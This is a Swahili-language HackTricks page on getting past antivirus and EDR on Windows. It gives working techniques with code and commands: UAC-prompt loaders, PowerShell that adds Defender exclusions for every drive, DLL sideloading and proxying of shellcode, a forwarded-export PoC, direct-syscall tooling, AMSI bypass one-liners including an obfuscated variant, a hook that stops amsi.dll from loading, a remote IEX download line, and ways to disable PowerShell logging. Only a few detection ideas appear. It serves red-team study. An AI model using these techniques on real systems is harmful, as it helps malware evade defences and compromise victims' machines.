# Kupita Kingavirusi (AV)

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa awali na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Simamisha Defender

- [defendnot](https://github.com/es3n1n/defendnot): Zana ya kusimamisha Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Zana ya kusimamisha Windows Defender kufanya kazi kwa kujifanya kuwa antivirus nyingine.
- [Zima Defender ikiwa wewe ni admin](basic-powershell-for-pentesters/README.md)

### Mtego wa UAC wa mtindo wa kisakinishi kabla ya kuchezea Defender

Loaders za umma zinazojifanya cheats za michezo mara nyingi husambazwa kama visakinishi vya Node.js/Nexe visivyosainiwa, ambavyo kwanza **humwomba mtumiaji ruhusa za juu** na kisha tu kudhoofisha Defender. Mchakato ni rahisi:

1. Chunguza ikiwa kuna muktadha wa kiutawala kwa kutumia `net session`. Amri hii hufaulu tu pale anayeiendesha ana haki za admin, kwa hiyo ikishindwa inaashiria kuwa loader inaendeshwa na mtumiaji wa kawaida.
2. Ianzishe tena mara moja kwa kutumia kitenzi cha `RunAs` ili kuonyesha kidokezo cha kawaida cha idhini ya UAC huku mstari wa amri wa awali ukihifadhiwa.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Waathiriwa tayari wanaamini kuwa wanasakinisha programu “iliyopasuliwa”, hivyo kwa kawaida hukubali ombi hilo, na kuipa malware haki inazohitaji kubadilisha sera ya Defender.<sup>[[26]](#references)</sup>

### Vighairi vya `MpPreference` vinavyohusu kila herufi ya kiendeshi

Baada ya kupata haki za juu, minyororo ya aina ya GachiLoader huongeza maeneo yasiyokaguliwa na Defender badala ya kuzima huduma moja kwa moja. Loader huanza kwa kusimamisha GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), kisha huweka **vighairi vipana sana** ili kila wasifu wa mtumiaji, saraka ya mfumo na diski inayoweza kutolewa isiweze kuchanganuliwa:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Mambo muhimu yaliyozingatiwa:

- Mzunguko huu hupitia kila filesystem iliyowekwa (D:\, E:\, USB sticks, n.k.), kwa hivyo **payload yoyote itakayowekwa popote kwenye diski baadaye itapuuzwa**.
- Kutenga kiendelezi `.sys` ni hatua ya kujiandaa kwa siku zijazo—washambuliaji wanahifadhi chaguo la kupakia drivers zisizosainiwa baadaye bila kugusa Defender tena.
- Mabadiliko yote yanawekwa chini ya `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, na hivyo hatua zinazofuata zinaweza kuthibitisha kuwa vizuizi vimeendelea kuwepo au kuvipanua bila kusababisha UAC kuonyeshwa tena.

Kwa kuwa hakuna huduma ya Defender inayosimamishwa, ukaguzi wa kawaida wa afya ya mfumo huendelea kuripoti “antivirus active” ingawa ukaguzi wa wakati halisi haukagui kamwe njia hizo.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Kwa sasa, AV hutumia mbinu tofauti kukagua kama faili ni hasidi au la: ugunduzi tuli, uchanganuzi wa nguvu, na kwa EDR za kisasa zaidi, uchanganuzi wa kitabia.

### **Ugunduzi tuli**

Ugunduzi tuli hufanywa kwa kutambua strings hasidi zinazojulikana au safu za byte katika binary au script, na pia kutoa taarifa kutoka kwenye faili lenyewe (kwa mfano, maelezo ya faili, jina la kampuni, saini za kidijitali, ikoni, checksum, n.k.). Hii inamaanisha kuwa kutumia zana za umma zinazojulikana kunaweza kufanya ugunduliwe kwa urahisi zaidi, kwa kuwa huenda tayari zimechanganuliwa na kuwekewa alama kuwa hasidi. Kuna njia kadhaa za kuepuka aina hii ya ugunduzi:

- **Usimbaji fiche**

Ukisimba binary kwa fiche, AV haitaweza kugundua programu yako, lakini utahitaji aina fulani ya loader ya kuifungua na kuiendesha kwenye memory.

- **Ufichaji**

Wakati mwingine unachohitaji ni kubadilisha baadhi ya strings kwenye binary au script yako ili kuipitisha kwenye AV, lakini hii inaweza kuchukua muda kutegemea unachojaribu kuficha.

- **Kutengeneza zana maalum**

Ukitengeneza zana zako mwenyewe, hakutakuwa na signatures mbaya zinazojulikana, lakini hilo huchukua muda na juhudi nyingi.

> [!TIP]
> Njia nzuri ya kuangalia dhidi ya ugunduzi tuli wa Windows Defender ni kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi hugawa faili katika sehemu nyingi kisha huagiza Defender kuchanganua kila sehemu kivyake; kwa njia hii, inaweza kukuambia hasa ni strings au bytes zipi kwenye binary yako zimewekewa alama.

Ninapendekeza sana uangalie [orodha hii ya video za YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu AV Evasion kwa vitendo.

### **Uchanganuzi wa nguvu**

Uchanganuzi wa nguvu ni wakati AV inaendesha binary yako kwenye sandbox na kufuatilia shughuli hasidi (kwa mfano, kujaribu kufungua na kusoma nywila za browser yako, kufanya minidump ya LSASS, n.k.). Sehemu hii inaweza kuwa ngumu kidogo kushughulikia, lakini haya ni baadhi ya mambo unayoweza kufanya ili kuepuka sandbox.

- **Kusubiri kabla ya kutekeleza** Kulingana na jinsi inavyotekelezwa, hii inaweza kuwa njia nzuri ya kukwepa uchanganuzi wa nguvu wa AV. AV zina muda mfupi sana wa kuchanganua faili ili zisiwe kikwazo kwa mtiririko wa kazi wa mtumiaji, kwa hivyo kusubiri kwa muda mrefu kunaweza kuvuruga uchanganuzi wa binary. Tatizo ni kwamba sandbox za AV nyingi zinaweza kuruka muda wa kusubiri, kutegemea jinsi ulivyotekelezwa.
- **Kukagua rasilimali za mashine** Kwa kawaida sandbox huwa na rasilimali chache sana za kutumia (kwa mfano, < 2GB RAM), la sivyo zinaweza kupunguza kasi ya mashine ya mtumiaji. Unaweza pia kuwa mbunifu sana hapa, kwa mfano, kwa kukagua joto la CPU au hata kasi ya feni; si kila kitu kitakuwa kimetekelezwa kwenye sandbox.
- **Ukaguzi mahususi kwa mashine** Ikiwa unataka kumlenga mtumiaji ambaye workstation yake imeunganishwa kwenye domain ya "contoso.local", unaweza kukagua domain ya kompyuta ili kuona kama inalingana na uliyobainisha. Isipolingana, unaweza kufanya programu yako itoke.

Imebainika kuwa computername ya sandbox ya Microsoft Defender ni HAL9TH. Kwa hiyo, unaweza kukagua jina la kompyuta kwenye malware yako kabla haijaanzishwa; jina likiwa HAL9TH, inamaanisha uko ndani ya sandbox ya Defender, hivyo unaweza kufanya programu yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Vidokezo vingine vizuri sana kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) kuhusu kukabiliana na sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> chaneli ya #malware-dev</p></figcaption></figure>

Kama tulivyosema awali kwenye chapisho hili, **zana za umma** hatimaye **hugunduliwa**, kwa hivyo unapaswa kujiuliza swali hili:

Kwa mfano, ikiwa unataka kudump LSASS, **unahitaji kweli kutumia mimikatz**? Au unaweza kutumia project nyingine isiyojulikana sana ambayo pia hudump LSASS?

Jibu sahihi huenda ni la pili. Tukitumia mimikatz kama mfano, huenda ni mojawapo ya malware zinazowekewa alama nyingi zaidi na AV na EDR, au ndiyo inayowekewa alama nyingi zaidi. Ingawa project yenyewe ni nzuri sana, pia ni jinamizi kuifanyia kazi ili kukwepa AV, kwa hiyo tafuta tu njia mbadala za kufanikisha unachojaribu kufanya.

> [!TIP]
> Unaporekebisha payload zako ili zikwepe ugunduzi, hakikisha **unazima uwasilishaji wa sampuli kiotomatiki** kwenye Defender, na tafadhali, kwa dhati, **USIPAKIE KWENYE VIRUSTOTAL** ikiwa lengo lako ni kufanikisha ukwepaji wa ugunduzi wa muda mrefu. Ikiwa unataka kuangalia kama AV fulani inagundua payload yako, isakinishe kwenye VM, jaribu kuzima uwasilishaji wa sampuli kiotomatiki, kisha ifanyie majaribio hapo hadi uridhike na matokeo.

## EXEs vs DLLs

Inapowezekana, **pendelea kutumia DLLs ili kukwepa ugunduzi**; kwa uzoefu wangu, faili za DLL kwa kawaida **hugunduliwa na kuchanganuliwa kwa kiwango cha chini zaidi**, kwa hiyo hii ni mbinu rahisi sana ya kutumia ili kuepuka ugunduzi katika baadhi ya hali (ikiwa payload yako ina njia fulani ya kuendeshwa kama DLL, bila shaka).

Kama tunavyoona kwenye picha hii, DLL Payload kutoka Havoc ina kiwango cha ugunduzi cha 4/26 kwenye antiscan.me, ilhali EXE payload ina kiwango cha ugunduzi cha 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>ulinganisho wa antiscan.me kati ya Havoc EXE payload ya kawaida na Havoc DLL ya kawaida</p></figcaption></figure>

Sasa tutaonyesha mbinu kadhaa unazoweza kutumia na faili za DLL ili kuwa fiche zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** hutumia mpangilio wa utafutaji wa DLL unaotumiwa na loader kwa kuweka programu lengwa na payload(s) hasidi pamoja kwenye eneo moja.

Unaweza kutafuta programu zilizo katika hatari ya DLL Sideloading ukitumia [Siofra](https://github.com/Cybereason/siofra) na script ifuatayo ya powershell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Amri hii itatoa orodha ya programu zilizoathiriwa na DLL hijacking ndani ya "C:\Program Files\\" pamoja na faili za DLL wanazojaribu kupakia.

Ninakupendekeza sana **uchunguze mwenyewe programu zinazoweza kufanyiwa DLL Hijacking/Sideloading**. Mbinu hii ni fiche sana ikitekelezwa vizuri, lakini ukitumia programu za DLL Sideloading zinazojulikana hadharani, unaweza kugundulika kwa urahisi.

Kuweka tu DLL hasidi yenye jina ambalo programu inatarajia kupakia hakutapakia payload yako, kwa sababu programu inatarajia kuwe na functions maalum ndani ya DLL hiyo. Ili kurekebisha tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** huelekeza miito ambayo programu hufanya kutoka kwa DLL ya proxy (na hasidi) kwenda kwenye DLL asili. Hivyo huhifadhi utendakazi wa programu na kuwezesha kushughulikia utekelezaji wa payload yako.

Nitatumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Amri ya mwisho itatupa faili 2: kiolezo cha msimbo chanzo wa DLL na DLL asilia iliyopewa jina jipya.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Haya ndiyo matokeo:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Shellcode yetu (iliyosimbwa kwa kutumia [SGN](https://github.com/EgeBalci/sgn)) pamoja na proxy DLL zina kiwango cha ugunduzi cha 0/26 kwenye [antiscan.me](https://antiscan.me)! Ningesema tumefaulu.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Ninapendekeza sana** utazame [VOD ya S3cur3Th1sSh1t kwenye Twitch](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [video ya ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kwa kina kuhusu tuliyojadili.

### Kutumia vibaya Forwarded Exports (ForwardSideLoading)

Moduli za Windows PE zinaweza kusafirisha functions ambazo kwa hakika ni "forwarders": badala ya kuelekeza kwenye code, ingizo la export huwa na mfuatano wa ASCII wa muundo `TargetDll.TargetFunc`. Mtu anapoomba kutatua export hiyo, Windows loader itafanya yafuatayo:

- Itapakia `TargetDll` ikiwa bado haijapakiwa
- Itatatua `TargetFunc` kutoka humo

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, hutolewa kutoka kwenye nafasi ya majina ya KnownDLLs iliyolindwa (kwa mfano, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ikiwa `TargetDll` si KnownDLL, hutumika mpangilio wa kawaida wa kutafuta DLL, unaojumuisha saraka ya moduli inayofanya forward resolution.

Hii huwezesha primitive ya sideloading isiyo ya moja kwa moja: tafuta DLL iliyosainiwa inayosafirisha function iliyoelekezwa kwenye jina la moduli isiyo KnownDLL, kisha iweke pamoja na DLL inayodhibitiwa na mshambulizi iliyopewa jina sawa kabisa na moduli lengwa lililoelekezwa. Forwarded export inapotumiwa, loader hutatua forward na kupakia DLL yako kutoka kwenye saraka hiyo hiyo, na kutekeleza DllMain yako.<sup>[[13]](#references)</sup>

Mfano ulioonekana kwenye Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` si KnownDLL, kwa hivyo hutafutwa kwa mpangilio wa kawaida wa utafutaji.

PoC (nakili-bandika):
1) Nakili DLL ya mfumo iliyotiwa saini kwenye folda inayoweza kuandikika
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` hasidi kwenye folda hiyo hiyo. DllMain ya msingi inatosha kutekeleza msimbo; huhitaji kutekeleza function iliyosambazwa ili kuanzisha DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Anzisha forward kwa kutumia LOLBin iliyotiwa saini:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Tabia iliyozingatiwa:
- rundll32 (signed) hupakia `keyiso.dll` ya side-by-side (signed)
- Wakati wa kutatua `KeyIsoSetAuditingInterface`, loader hufuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader hupakia `NCRYPTPROV.dll` kutoka `C:\test` na kutekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatekelezwa, utapata hitilafu ya "missing API" baada tu ya `DllMain` kuendeshwa

Vidokezo vya kutafuta:
- Lenga forwarded exports ambako target module si KnownDLL. KnownDLLs zimeorodheshwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha forwarded exports kwa kutumia zana kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Angalia orodha ya Windows 11 forwarder ili kutafuta zinazoweza kufaa: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Mawazo ya kugundua/kuzuia:
- Fuatilia LOLBins (k.m., rundll32.exe) zinazopakia DLL zilizotiwa sahihi kutoka kwenye njia zisizo za mfumo, kisha kupakia non-KnownDLLs zenye jina msingi sawa kutoka kwenye saraka hiyo
- Toa arifa kuhusu minyororo ya process/module kama: `rundll32.exe` → `keyiso.dll` isiyo ya mfumo → `NCRYPTPROV.dll` kwenye njia ambazo watumiaji wanaweza kuandikia
- Tekeleza sera za uadilifu wa code (WDAC/AppLocker) na ukatae ruhusa za kuandika+kutekeleza kwenye saraka za programu

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni toolkit ya payload ya kukwepa EDR kwa kutumia process zilizosimamishwa, direct syscalls, na mbinu mbadala za utekelezaji`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya siri.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya tu; kinachofanya kazi leo kinaweza kugunduliwa kesho. Kwa hiyo, usitegemee zana moja tu. Ikiwezekana, jaribu kuunganisha mbinu nyingi za evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR mara nyingi huweka **user-mode inline hooks** kwenye syscall stubs za `ntdll.dll`. Ili kukwepa hooks hizo, unaweza kutengeneza **direct** au **indirect** syscall stubs zinazopakia **SSN** (System Service Number) sahihi na kuingia kwenye kernel mode bila kutekeleza hooked export entrypoint.<sup>[[32]](#references)</sup>

**Chaguo za kuita:**
- **Direct (embedded)**: weka maagizo ya `syscall`/`sysenter`/`SVC #0` kwenye stub iliyotengenezwa (bila kufikia export ya `ntdll`).
- **Indirect**: ruka hadi kwenye gadget iliyopo ya `syscall` ndani ya `ntdll` ili mabadiliko ya kwenda kernel yaonekane kana kwamba yalianzia `ntdll` (inafaa kwa kukwepa heuristics); **randomized indirect** huchagua gadget kutoka kwenye kundi kwa kila mwito.
- **Egg-hunt**: epuka kuweka mfuatano tuli wa opcode `0F 05` kwenye diski; tafuta mfuatano wa syscall wakati programu inaendeshwa.

**Mikakati ya kutatua SSN inayostahimili hooks:**
- **FreshyCalls (VA sort)**: kadiria SSN kwa kupanga syscall stubs kulingana na anwani zao za virtual, badala ya kusoma bytes za stub.
- **SyscallsFromDisk**: weka `\KnownDlls\ntdll.dll` safi kwenye memory, soma SSN kutoka `.text` yake, kisha iondoe (hukwepa hooks zote zilizo kwenye memory).
- **RecycledGate**: changanya makadirio ya SSN kwa mpangilio wa VA na uthibitishaji wa opcode wakati stub iko safi; tumia makadirio ya VA ikiwa ina hook.
- **HW Breakpoint**: weka DR0 kwenye maagizo ya `syscall` na utumie VEH kunasa SSN kutoka `EAX` wakati programu inaendeshwa, bila kuchanganua bytes zilizo na hooks.

Mfano wa matumizi ya SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI iliundwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Awali, AVs ziliweza kuchanganua **faili zilizo kwenye diski** pekee, kwa hivyo ikiwa ungeweza kwa namna fulani kutekeleza payloads **moja kwa moja kwenye memory**, AV isingeweza kufanya chochote kuizuia, kwa kuwa haikuwa na mwonekano wa kutosha.

Kipengele cha AMSI kimeunganishwa katika vipengele hivi vya Windows.

- User Account Control, au UAC (kupandisha ruhusa za EXE, COM, MSI, au usakinishaji wa ActiveX)
- PowerShell (scripts, matumizi shirikishi, na tathmini ya msimbo inayobadilika)
- Windows Script Host (wscript.exe na cscript.exe)
- JavaScript na VBScript
- Office VBA macros

Kipengele hiki huruhusu suluhisho za antivirus kukagua tabia ya script kwa kufichua maudhui ya script katika umbo ambalo halijasimbwa kwa njia fiche wala kufichwa.

Kuendesha `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutasababisha tahadhari ifuatayo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Angalia jinsi inavyoweka `amsi:` mwanzoni, ikifuatiwa na njia ya executable ambayo script iliendeshwa kutoka kwayo; katika hali hii, powershell.exe

Hatukuweka faili yoyote kwenye diski, lakini bado tulinaswa tukiwa kwenye memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia **.NET 4.8**, msimbo wa C# pia hupitishwa kupitia AMSI. Hii huathiri hata `Assembly.Load(byte[])` inayotumika kupakia utekelezaji kwenye memory. Ndiyo maana kutumia matoleo ya chini ya .NET (kama vile 4.7.2 au ya chini zaidi) kunapendekezwa kwa utekelezaji kwenye memory ikiwa unataka kukwepa AMSI.

Kuna njia kadhaa za kukwepa AMSI:

- **Obfuscation**

Kwa kuwa AMSI hufanya kazi hasa kwa kutumia utambuzi tuli, kurekebisha scripts unazojaribu kupakia kunaweza kuwa njia nzuri ya kukwepa utambuzi.

Hata hivyo, AMSI ina uwezo wa kuondoa obfuscation kwenye scripts hata zikiwa na tabaka nyingi, kwa hivyo obfuscation inaweza kuwa chaguo baya kutegemea jinsi inavyofanywa. Hii hufanya kuikwepa kusiwe jambo la moja kwa moja. Ingawa, wakati mwingine, unachohitaji tu ni kubadilisha majina kadhaa ya vigezo na utakuwa sawa; kwa hivyo inategemea ni kwa kiwango gani kitu kimewekwa alama.

- **AMSI Bypass**

Kwa kuwa AMSI hutekelezwa kwa kupakia DLL ndani ya mchakato wa powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuichezea kwa urahisi hata ukiwa unaendesha kama mtumiaji asiye na ruhusa za juu. Kutokana na dosari hii katika utekelezaji wa AMSI, watafiti wamegundua njia nyingi za kukwepa uchanganuzi wa AMSI.

**Kulazimisha Hitilafu**

Kulazimisha uanzishaji wa AMSI ushindwe (amsiInitFailed) kutasababisha uchanganuzi usianzishwe kwa mchakato wa sasa. Hili lilifichuliwa awali na [Matt Graeber](https://twitter.com/mattifestation), na Microsoft imetengeneza signature ili kuzuia matumizi yake kuenea zaidi.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Kilichohitajika tu ni mstari mmoja wa code ya PowerShell ili kufanya AMSI isiweze kutumika katika mchakato wa sasa wa PowerShell. Bila shaka, mstari huu umetambuliwa na AMSI yenyewe, kwa hivyo unahitaji kufanyiwa marekebisho ili kutumia mbinu hii.

Huu hapa ni AMSI bypass iliyorekebishwa niliyochukua kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Kumbuka kwamba huenda hili likagunduliwa mara tu chapisho hili litakapotoka, kwa hiyo hupaswi kuchapisha code yoyote ikiwa mpango wako ni kubaki bila kugunduliwa.

**Memory Patching**

Mbinu hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta anwani ya function ya "AmsiScanBuffer" katika amsi.dll (inayohusika na kuchanganua ingizo lililotolewa na mtumiaji) na kuibadilisha kwa maagizo ya kurudisha code ya E_INVALIDARG. Kwa njia hii, matokeo ya uchanganuzi halisi yatakuwa 0, ambayo hutafsiriwa kama matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo zaidi.

Pia kuna mbinu nyingine nyingi zinazotumika kupita AMSI kwa kutumia powershell. Angalia [**ukurasa huu**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**repo hii**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuzihusu.

### Kuzuia AMSI kwa kuzuia amsi.dll kupakiwa (LdrLoadDll hook)

AMSI huanzishwa tu baada ya `amsi.dll` kupakiwa katika process ya sasa. Njia thabiti ya kupita AMSI isiyofungamana na lugha ni kuweka hook ya user-mode kwenye `ntdll!LdrLoadDll` ambayo hurudisha hitilafu wakati module inayoombwa ni `amsi.dll`. Kwa hiyo, AMSI haipakii kamwe na hakuna uchanganuzi unaofanyika kwa process hiyo.<sup>[[23]](#references)</sup>

Muhtasari wa utekelezaji (pseudocode ya x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Vidokezo
- Hufanya kazi na PowerShell, WScript/CScript na custom loaders kwa pamoja (chochote ambacho kingepakia AMSI vinginevyo).
- Changanya na kuingiza scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka mabaki marefu ya command-line.
- Imeonekana ikitumiwa na loaders zinazoendeshwa kupitia LOLBins (kwa mfano, `regsvr32` ikiita `DllRegisterServer`).

Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** pia hutengeneza script ya kupita AMSI.
Tool **[https://amsibypass.com/](https://amsibypass.com/)** pia hutengeneza script ya kupita AMSI inayokwepa signature kwa kutumia function zilizobainishwa na mtumiaji zenye majina yaliyowekwa nasibu, variables na character expression; na hutumia ukubwa wa herufi nasibu kwa keywords za PowerShell ili kuepuka signature.

**Ondoa signature iliyogunduliwa**

Unaweza kutumia tool kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** ili kuondoa AMSI signature iliyogunduliwa kwenye memory ya process ya sasa. Tool hii huchanganua memory ya process ya sasa kutafuta AMSI signature, kisha kuibadilisha kwa maelekezo ya NOP, na hivyo kuiondoa kwenye memory.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI kwenye **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia toleo la 2 la PowerShell**
Ukitumia PowerShell version 2, AMSI haitapakiwa, kwa hivyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi:

```bash
powershell.exe -version 2
```

## Uwekaji wa Kumbukumbu za PS

Uwekaji wa kumbukumbu za PowerShell ni kipengele kinachokuwezesha kuweka kumbukumbu za amri zote za PowerShell zilizotekelezwa kwenye mfumo. Hii inaweza kuwa na manufaa kwa madhumuni ya ukaguzi na utatuzi wa matatizo, lakini pia inaweza kuwa **tatizo kwa washambuliaji wanaotaka kukwepa kutambuliwa**.

Ili kukwepa uwekaji wa kumbukumbu za PowerShell, unaweza kutumia mbinu zifuatazo:

- **Zima PowerShell Transcription na Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Tumia PowerShell version 2**: Ukitumia PowerShell version 2, AMSI haitapakiwa, kwa hivyo unaweza kuendesha scripts zako bila kuchunguzwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Tumia kipindi cha PowerShell kisichodhibitiwa**: Tumia [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kupangisha PowerShell bila kuwasha `powershell.exe` (mbinu inayotumiwa na `powerpick` ya Cobalt Strike). Hii hukwepa vidhibiti vinavyohusishwa mahsusi na mchakato wa `powershell.exe`, lakini haizimi moja kwa moja AMSI, Script Block Logging, au kila ulinzi mwingine wa PowerShell; kiwango cha ulinzi hutegemea runtime na utekelezaji wa host.


